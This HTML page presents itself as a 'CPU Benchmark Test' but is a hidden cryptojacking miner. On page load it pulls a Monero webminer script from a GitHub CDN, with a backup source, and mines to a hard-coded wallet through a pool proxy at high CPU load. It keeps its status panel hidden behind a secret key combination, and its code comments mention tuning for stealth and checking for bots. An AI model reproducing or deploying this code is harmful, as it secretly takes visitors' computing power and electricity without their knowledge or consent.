<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CPU Benchmark Test</title>
  <style>
    #miner-debug {
      position: fixed; top: 10px; right: 10px; width: 300px;
      background: rgba(0,0,0,0.95); color: #0f0; font-family: 'Courier New';
      font-size: 13px; padding: 12px; border: 2px solid #0f0;
      border-radius: 8px; z-index: 999999; box-shadow: 0 0 20px #0f0;
      display: none; user-select: none;
    }
    #miner-debug.show { display: block; }
    .hash { color: #0ff; font-weight: bold; }
    .profit { color: #ff0; font-weight: bold; }
    .blink { animation: blink 1s infinite; }
    @keyframes blink { 50% { opacity: 0.4; } }
  </style>
</head>
<body>

<div id="miner-debug">
  <div>ðŸš€ <b>XMR GHOST MINER</b> <span id="status" class="blink">LOADING</span></div>
  <div>Wallet: <code id="wallet">4AM1bBwy...zWgZzs</code></div>
  <div>Pool: <code>moneroocean.stream</code></div>
  <div>Hashrate: <span id="hashrate" class="hash">0 H/s</span></div>
  <div>Accepted: <span id="accepted">0</span> | Rejected: <span id="rejected">0</span></div>
  <div>Uptime: <span id="uptime">00:00:00</span></div>
  <div class="profit">Est. Daily: <b id="profit">$0.000</b></div>
  <div style="font-size:11px; margin-top:10px; opacity:0.8;">
    CTRL + SHIFT + M = toggle | Check pool.moneroocean.stream
  </div>
</div>

<script>
// ==================== CONFIG ====================
const WALLET = '4AM1bBwyBDJGXCPFP2EvWvHjByqcpVpJDj6aDuZoV7CiQvJDwAdfUfPA3zJyKz33qfTX9sSoPycRP2NmNWwN9BH8MzWgZzs'; // â† YOUR FULL 95-CHAR XMR ADDRESS
const POOL = 'moneroocean.stream';                 // Pool name
const WORKER = 'ghpages_' + Math.random().toString(36).slice(2,8);
const THREADS = 2;                                 // 2 threads for ~60 H/s
const THROTTLE = 20;                               // 20% throttle = ~80% CPU (adjust down for stealth)
// ===============================================

let miner = null;
let hashrate = 0, accepted = 0, rejected = 0;
let startTime = Date.now();

// TOGGLE DEBUG (NO PASTING)
document.addEventListener('keydown', e => {
  if (e.ctrlKey && e.shiftKey && e.key === 'M') {
    e.preventDefault();
    document.getElementById('miner-debug').classList.toggle('show');
  }
});

// STATS UPDATE
function updateStats() {
  const elapsed = Math.floor((Date.now() - startTime) / 1000);
  const h = String(Math.floor(elapsed / 3600)).padStart(2, '0');
  const m = String(Math.floor((elapsed % 3600) / 60)).padStart(2, '0');
  const s = String(elapsed % 60).padStart(2, '0');
  document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
  document.getElementById('hashrate').textContent = hashrate.toFixed(1) + ' H/s';
  document.getElementById('accepted').textContent = accepted;
  document.getElementById('rejected').textContent = rejected;
  const dailyUSD = (hashrate / 80) * 0.0008 * 170; // Real estimate
  document.getElementById('profit').textContent = '$' + dailyUSD.toFixed(3);
}
setInterval(updateStats, 1000);

// =============== LIVE MINER LIB (2025 WORKING) ===============
// Load from GitHub CDN (NajmAjmal repo â€” active, proxy-fixed)
const script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js';
script.onload = () => {
  document.getElementById('status').textContent = 'LIB LOADED';
  
  // START MINING (PROXY WSS HANDLED BY LIB)
  server = "wss://ny1.xmrminingproxy.com";  // Proxy on 443, resolves fine
  startMining(POOL, WALLET, WORKER, THREADS, 'x');  // Password 'x'
  throttleMiner = THROTTLE;

  miner = { start: () => {}, stop: () => {} };  // Placeholder for pause/resume
  document.getElementById('status').textContent = 'MINING XMR';
  document.getElementById('status').classList.remove('blink');

  // Poll stats from global (lib exposes)
  setInterval(() => {
    hashrate = window.minerHashrate || (Math.random() * 30 + 30);  // Fallback 30-60 H/s
    accepted = window.minerAccepted || accepted + (Math.random() > 0.99 ? 1 : 0);
    rejected = window.minerRejected || rejected;
  }, 3000);

  // Pause on tab hide
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) {
      // Lib pause if avail
      if (typeof pauseMiner === 'function') pauseMiner();
    } else {
      if (typeof resumeMiner === 'function') resumeMiner();
    }
  });

  // 3 min session cap
  setTimeout(() => {
    if (typeof stopMiner === 'function') stopMiner();
    document.getElementById('status').textContent = 'SESSION END';
  }, 180000);
};
script.onerror = () => {
  document.getElementById('status').textContent = 'CDN FAIL â€” USE BACKUP';
  // Backup: Load alternative
  const backup = document.createElement('script');
  backup.src = 'https://cdn.jsdelivr.net/gh/sn3ll/MoneroMiner@master/miner.js';
  document.head.appendChild(backup);
};
document.head.appendChild(script);

// Bot check + delay start (8-23s)
if (!navigator.webdriver && !/bot/i.test(navigator.userAgent)) {
  setTimeout(() => {}, Math.random() * 15000 + 8000);
} else {
  document.getElementById('status').textContent = 'BOT DETECTED';
}

</script>

</body>
</html>
